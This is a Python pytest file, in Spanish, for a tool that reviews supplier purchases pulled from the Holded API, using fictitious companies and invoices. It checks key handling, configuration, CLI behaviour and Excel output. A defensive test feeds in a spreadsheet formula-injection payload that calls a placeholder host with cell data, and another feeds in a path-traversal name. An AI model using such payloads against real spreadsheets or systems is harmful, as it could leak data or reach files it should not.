"""Configuración, clave, CLI e informe de punta a punta con datos ficticios."""

import io
import json
import os
import subprocess
import sys
import zipfile
from datetime import date
from decimal import Decimal
from pathlib import Path

import pytest
from openpyxl import load_workbook

from revision_compras import cli
from revision_compras.configuracion import (
    ErrorConfiguracion,
    cargar_clave,
    cargar_configuracion,
    hay_clave_generica,
    variable_clave_empresa,
)
from revision_compras.holded import ClienteHolded, Respuesta

CLAVE = "clave-ficticia-cli-9876543210"
VARIABLE = "HOLDED_API_KEY_FICTICIA"
RAIZ_AUTOMATIZACION = Path(__file__).resolve().parents[1]
HOY = date(2026, 11, 10)

CONFIG = """\
empresa:
  nombre: "Empresa Ficticia, S.L."
  nif: "B00000099"
revision_compras:
  nif_propio: "B00000099"
  umbral_subida_precio: 5
  fecha_desde: 2026-01-01
"""

COMPRAS = [
    {"id": "1", "document_number": "F-1", "contact_id": "c1", "contact_name": "Proveedor Ejemplo SL",
     "date": "2026-03-10", "total": "242.00", "lines": [{"name": "Pieza", "price": "200", "units": "1"}]},
    {"id": "2", "document_number": "F-2", "contact_id": "c1", "contact_name": "Proveedor Ejemplo SL",
     "date": "2026-03-10", "total": "242.00", "lines": [{"name": "Pieza", "price": "200", "units": "1"}]},
    {"id": "3", "document_number": "P-7", "contact_id": "c2", "contact_name": "Suministros Inventados SA",
     "description": "Presupuesto de mantenimiento", "date": "2026-04-01", "total": "500.00", "lines": []},
    {"id": "4", "document_number": "F-9", "contact_id": "c2", "contact_name": "Suministros Inventados SA",
     "date": "2025-06-01", "total": "10.00", "lines": []},
]
ABONOS = [{"id": "a1", "document_number": "AB-1", "contact_id": "c2", "contact_name": "Suministros Inventados SA",
           "date": "2026-04-05", "total": "-50.00", "lines": []}]
CONTACTOS = [
    {"id": "c1", "name": "Proveedor Ejemplo SL", "code": "B00000099", "type": "supplier"},
    {"id": "c2", "name": "Suministros Inventados SA", "code": "", "type": "supplier"},
]


@pytest.fixture
def entorno(tmp_path):
    repo = tmp_path / "repo"
    (repo / "clientes" / "ficticia").mkdir(parents=True)
    (repo / "clientes" / "ficticia" / "config.yaml").write_text(CONFIG, encoding="utf-8")
    automatizacion = tmp_path / "auto"
    automatizacion.mkdir()
    return repo, automatizacion


def ok(datos):
    return Respuesta(200, {}, json.dumps(datos).encode())


def fabrica_falsa(registro):
    def transporte(metodo, url, cabeceras, timeout):
        registro.append((metodo, url))
        if "purchase-refunds" in url:
            return ok({"items": ABONOS, "has_more": False, "cursor": None})
        if "purchases" in url:
            return ok({"items": COMPRAS, "has_more": False, "cursor": None})
        return ok({"items": CONTACTOS, "has_more": False, "cursor": None})

    def fabrica(clave, **kw):
        return ClienteHolded(clave, transporte=transporte, dormir=lambda s: None, **kw)

    return fabrica


def ejecutar(argv, repo, automatizacion, entorno_vars=None, fabrica=None):
    salida = io.StringIO()
    codigo = cli.main(
        argv, raiz_automatizacion=automatizacion, raiz_repo=repo,
        entorno=entorno_vars if entorno_vars is not None else {},
        hoy=HOY, salida=salida,
        fabrica_cliente=fabrica or fabrica_falsa([]),
    )
    return codigo, salida.getvalue()


# --------------------------------------------------------------- clave API

def test_clave_de_la_empresa_desde_variable_de_entorno(tmp_path):
    clave = cargar_clave("ficticia", {"HOLDED_API_KEY_FICTICIA": " abc "}, tmp_path)
    assert clave.valor == "abc"
    assert clave.origen == "variable de entorno HOLDED_API_KEY_FICTICIA"
    assert "abc" not in repr(clave)


def test_nombre_de_variable_por_empresa():
    assert variable_clave_empresa("empresa-demo") == "HOLDED_API_KEY_EMPRESA_DEMO"


def test_clave_desde_env_de_la_empresa_y_del_repositorio(tmp_path):
    repo = tmp_path / "repo"
    (repo / "clientes" / "ficticia").mkdir(parents=True)
    (repo / ".env").write_text('# comentario\nexport HOLDED_API_KEY_FICTICIA="del-repo"\n', encoding="utf-8")
    assert cargar_clave("ficticia", {}, repo).valor == "del-repo"
    (repo / "clientes" / "ficticia" / ".env").write_text("HOLDED_API_KEY=de-la-empresa  # nota\n", encoding="utf-8")
    clave = cargar_clave("ficticia", {}, repo)
    assert clave.valor == "de-la-empresa" and clave.origen.startswith("clientes/ficticia/.env")
    assert cargar_clave("ficticia", {"HOLDED_API_KEY_FICTICIA": "del-entorno"}, repo).valor == "del-entorno"


def test_la_clave_generica_no_se_usa_sin_pedirlo(tmp_path):
    """Con la clave de la empresa A en HOLDED_API_KEY, --empresa B no debe descargar los datos de A."""
    (tmp_path / ".env").write_text("HOLDED_API_KEY=clave-de-otra-empresa\n", encoding="utf-8")
    entorno = {"HOLDED_API_KEY": "clave-de-otra-empresa"}
    assert cargar_clave("ficticia", entorno, tmp_path) is None
    assert hay_clave_generica(entorno, tmp_path)
    clave = cargar_clave("ficticia", entorno, tmp_path, generica=True)
    assert clave.valor == "clave-de-otra-empresa" and "genérica" in clave.origen


def test_el_env_del_directorio_actual_no_cambia_la_clave(tmp_path, monkeypatch):
    repo, actual = tmp_path / "repo", tmp_path / "actual"
    repo.mkdir(); actual.mkdir()
    (actual / ".env").write_text("HOLDED_API_KEY_FICTICIA=de-otra-carpeta\n", encoding="utf-8")
    monkeypatch.chdir(actual)
    assert cargar_clave("ficticia", {}, repo) is None


def test_sin_clave_devuelve_none(tmp_path):
    (tmp_path / ".env").write_text("HOLDED_API_KEY_FICTICIA=\n", encoding="utf-8")
    assert cargar_clave("ficticia", {}, tmp_path) is None


# ----------------------------------------------------------- configuración

def test_configuracion_valida(entorno):
    repo, _ = entorno
    c = cargar_configuracion("ficticia", raiz_repo=repo)
    assert c.parametros.nif_propio == "B00000099"
    assert c.parametros.umbral_subida_precio == Decimal("5")
    assert c.fecha_desde == date(2026, 1, 1)
    assert "devolver" in c.parametros.palabras_abono
    assert c.version_api == "v2"


def test_configuracion_inexistente_explica_como_crearla(tmp_path):
    with pytest.raises(ErrorConfiguracion, match="_plantilla"):
        cargar_configuracion("noexiste", raiz_repo=tmp_path)


@pytest.mark.parametrize("nombre", ["../otra", "_plantilla", "", "a b"])
def test_nombre_de_empresa_invalido(nombre, tmp_path):
    with pytest.raises(ErrorConfiguracion):
        cargar_configuracion(nombre, raiz_repo=tmp_path)


def test_plantilla_del_repositorio_es_valida():
    plantilla = RAIZ_AUTOMATIZACION.parents[1] / "clientes" / "_plantilla" / "config.example.yaml"
    c = cargar_configuracion("ejemplo", ruta=plantilla)
    assert c.parametros.umbral_subida_precio == Decimal("5")
    assert "presupuesto" in c.parametros.palabras_presupuesto


# --------------------------------------------------------------------- CLI

def test_cli_sin_clave_da_error_claro_y_no_llama_a_la_api(entorno, capsys):
    repo, auto = entorno
    llamadas = []
    codigo, _ = ejecutar(["--empresa", "ficticia"], repo, auto, fabrica=fabrica_falsa(llamadas))
    assert codigo == cli.SALIDA_ERROR_CONFIG
    err = capsys.readouterr().err
    assert VARIABLE in err and "Credenciales" in err and "--cache" in err
    assert llamadas == []


def test_cli_con_solo_la_clave_generica_no_descarga_sin_pedirlo(entorno, capsys):
    repo, auto = entorno
    llamadas = []
    codigo, _ = ejecutar(["--empresa", "ficticia"], repo, auto,
                         entorno_vars={"HOLDED_API_KEY": CLAVE}, fabrica=fabrica_falsa(llamadas))
    assert codigo == cli.SALIDA_ERROR_CONFIG and llamadas == []
    assert "--clave-generica" in capsys.readouterr().err
    codigo, salida = ejecutar(["--empresa", "ficticia", "--clave-generica"], repo, auto,
                              entorno_vars={"HOLDED_API_KEY": CLAVE}, fabrica=fabrica_falsa(llamadas))
    assert codigo == cli.SALIDA_OK and llamadas
    assert "Clave de Holded leída de: variable de entorno HOLDED_API_KEY (genérica)" in salida
    assert CLAVE not in salida


def test_cli_sin_configuracion_da_error_claro(entorno, capsys):
    repo, auto = entorno
    codigo, _ = ejecutar(["--empresa", "otra"], repo, auto, entorno_vars={VARIABLE: CLAVE})
    assert codigo == cli.SALIDA_ERROR_CONFIG
    assert "clientes/otra/" in capsys.readouterr().err


def test_cli_descarga_revisa_y_genera_informes_sin_mostrar_la_clave(entorno, capsys):
    repo, auto = entorno
    llamadas = []
    codigo, salida = ejecutar(["--empresa", "ficticia"], repo, auto,
                              entorno_vars={VARIABLE: CLAVE}, fabrica=fabrica_falsa(llamadas))
    assert codigo == cli.SALIDA_OK, capsys.readouterr().err
    assert {m for m, _ in llamadas} == {"GET"}
    assert all("start_date=2026-01-01" in u for _, u in llamadas if "purchase" in u)

    datos = auto / "datos" / "ficticia"
    assert json.loads((datos / "compras.json").read_text())[0]["id"] == "1"
    excel = auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.xlsx"
    md = auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.md"
    assert excel.is_file() and md.is_file()

    # La clave no aparece en la salida ni en ningún archivo generado
    assert CLAVE not in salida + capsys.readouterr().err
    assert f"Clave de Holded leída de: variable de entorno {VARIABLE}." in salida
    for archivo in list(datos.iterdir()) + [md]:
        assert CLAVE not in archivo.read_text(encoding="utf-8")
    assert CLAVE.encode() not in excel.read_bytes()
    assert "No se ha modificado nada en Holded" in salida

    libro = load_workbook(excel)
    avisos = libro["Avisos"]
    tipos = [avisos.cell(row=r, column=2).value for r in range(2, avisos.max_row + 1)]
    assert "Posible duplicado" in tipos
    assert "Documento mal registrado" in tipos
    assert "Ficha de proveedor errónea" in tipos
    # La compra de 2025 queda fuera de la fecha desde
    assert all("F-9" not in (avisos.cell(row=r, column=4).value or "") for r in range(2, avisos.max_row + 1))


def test_cli_con_cache_no_llama_a_la_api_ni_necesita_clave(entorno, capsys):
    repo, auto = entorno
    assert ejecutar(["--empresa", "ficticia"], repo, auto, entorno_vars={VARIABLE: CLAVE})[0] == 0
    llamadas = []
    codigo, salida = ejecutar(["--empresa", "ficticia", "--cache", "--desde", "2025-01-01"], repo, auto,
                              fabrica=fabrica_falsa(llamadas))
    assert codigo == 0 and llamadas == []
    assert "sin llamar a la API" in salida
    assert "no incluyen compras anteriores" in salida


def test_cli_cache_vacia_da_error_claro(entorno, capsys):
    repo, auto = entorno
    codigo, _ = ejecutar(["--empresa", "ficticia", "--cache"], repo, auto)
    assert codigo == cli.SALIDA_ERROR_CONFIG
    assert "sin --cache" in capsys.readouterr().err


def test_cli_fecha_desde_invalida(entorno, capsys):
    repo, auto = entorno
    codigo, _ = ejecutar(["--empresa", "ficticia", "--desde", "10/01/2026"], repo, auto,
                         entorno_vars={VARIABLE: CLAVE})
    assert codigo == cli.SALIDA_ERROR_CONFIG
    assert "AAAA-MM-DD" in capsys.readouterr().err


def test_cli_real_sin_clave_por_subproceso(entorno):
    """Ejecuta `python -m revision_compras` de verdad, sin clave, con una configuración ficticia."""
    repo, _ = entorno
    env = {k: v for k, v in os.environ.items() if not k.startswith("HOLDED_API_KEY")}
    if cargar_clave("ficticia", env):
        pytest.skip("Hay una clave en el .env del repositorio: no se ejecuta para no llamar a la API real.")
    r = subprocess.run(
        [sys.executable, "-m", "revision_compras", "--empresa", "ficticia",
         "--config", str(repo / "clientes" / "ficticia" / "config.yaml")],
        cwd=repo, env={**env, "PYTHONPATH": str(RAIZ_AUTOMATIZACION)},
        capture_output=True, text=True, timeout=60,
    )
    assert r.returncode == cli.SALIDA_ERROR_CONFIG
    assert "No se encuentra la clave de la API de Holded" in r.stderr
    assert "Traceback" not in r.stderr


# ------------------------------------------------------------------ informe

def test_excel_formulas_formatos_y_filtros(entorno):
    repo, auto = entorno
    ejecutar(["--empresa", "ficticia"], repo, auto, entorno_vars={VARIABLE: CLAVE})
    libro = load_workbook(auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.xlsx")
    assert libro.sheetnames == ["Resumen", "Avisos"]
    avisos, resumen = libro["Avisos"], libro["Resumen"]
    assert avisos.auto_filter.ref.startswith("A1:H")
    assert avisos["A1"].font.name == "Arial" and avisos["A2"].font.name == "Arial"
    assert avisos["E2"].number_format == "dd/mm/yyyy"
    assert "€" in avisos["F2"].number_format
    assert avisos["A2"].fill.fgColor.rgb.endswith(("F4CCCC", "FCE5CD", "D9EAD3"))
    formulas = [c.value for fila in resumen.iter_rows() for c in fila if isinstance(c.value, str) and c.value.startswith("=")]
    assert any(f.startswith("=COUNTIF(Avisos!") for f in formulas)
    assert any(f.startswith("=SUMIF(Avisos!") for f in formulas)
    assert all(c.font.name == "Arial" for fila in resumen.iter_rows() for c in fila if c.value is not None)


def test_excel_guarda_como_texto_lo_que_parece_una_formula(tmp_path):
    from revision_compras.informe import escribir_excel
    from revision_compras.modelo import Aviso

    aviso = Aviso("alta", "Posible duplicado", '=HYPERLINK("http://x.example/?"&A1,"Proveedor")', "=1+1",
                  date(2026, 3, 1), Decimal("10"), "+detalle", "@accion")
    ruta = escribir_excel([aviso], tmp_path / "x.xlsx", "=1+2", HOY, None, 1, 1)
    libro = load_workbook(ruta)
    avisos = libro["Avisos"]
    assert avisos["C2"].data_type == "s" and avisos["C2"].value.startswith("=HYPERLINK")
    assert avisos["D2"].data_type == "s" and avisos["D2"].value == "=1+1"
    assert libro["Resumen"]["B3"].data_type == "s" and libro["Resumen"]["B3"].value == "=1+2"
    with zipfile.ZipFile(ruta) as z:
        assert "<f>" not in z.read("xl/worksheets/sheet2.xml").decode()


def test_caracteres_de_control_de_holded_no_rompen_el_informe(entorno, capsys):
    """Un salto de página (\\x0c) copiado de un PDF en el nombre del proveedor."""
    repo, auto = entorno
    compras = [dict(c, contact_name="Prov\x0cX\x0b") for c in COMPRAS]

    def transporte(metodo, url, cabeceras, timeout):
        if "purchase-refunds" in url:
            return ok({"items": [], "has_more": False})
        if "purchases" in url:
            return ok({"items": compras, "has_more": False})
        return ok({"items": CONTACTOS, "has_more": False})

    def fabrica(clave, **kw):
        return ClienteHolded(clave, transporte=transporte, dormir=lambda s: None, **kw)

    codigo, _ = ejecutar(["--empresa", "ficticia"], repo, auto, entorno_vars={VARIABLE: CLAVE}, fabrica=fabrica)
    assert codigo == cli.SALIDA_OK, capsys.readouterr().err
    libro = load_workbook(auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.xlsx")
    proveedores = {libro["Avisos"].cell(row=r, column=3).value for r in range(2, libro["Avisos"].max_row + 1)}
    assert "ProvX" in proveedores


def test_el_informe_avisa_de_que_no_hay_notas(entorno):
    repo, auto = entorno
    ejecutar(["--empresa", "ficticia"], repo, auto, entorno_vars={VARIABLE: CLAVE})
    md = (auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.md").read_text(encoding="utf-8")
    assert "no traen las notas" in md
    libro = load_workbook(auto / "resultados" / "ficticia" / "revision_compras_2026-11-10.xlsx")
    textos = [c.value for fila in libro["Resumen"].iter_rows() for c in fila if isinstance(c.value, str)]
    assert any("no traen las notas" in t for t in textos)


def test_configuracion_zona_horaria(entorno):
    repo, _ = entorno
    ruta = repo / "clientes" / "ficticia" / "config.yaml"
    ruta.write_text(CONFIG + "  zona_horaria: Atlantic/Canary\n", encoding="utf-8")
    assert cargar_configuracion("ficticia", raiz_repo=repo).zona_horaria == "Atlantic/Canary"
    ruta.write_text(CONFIG + "  zona_horaria: Marte/Olympus\n", encoding="utf-8")
    with pytest.raises(ErrorConfiguracion, match="zona_horaria"):
        cargar_configuracion("ficticia", raiz_repo=repo)
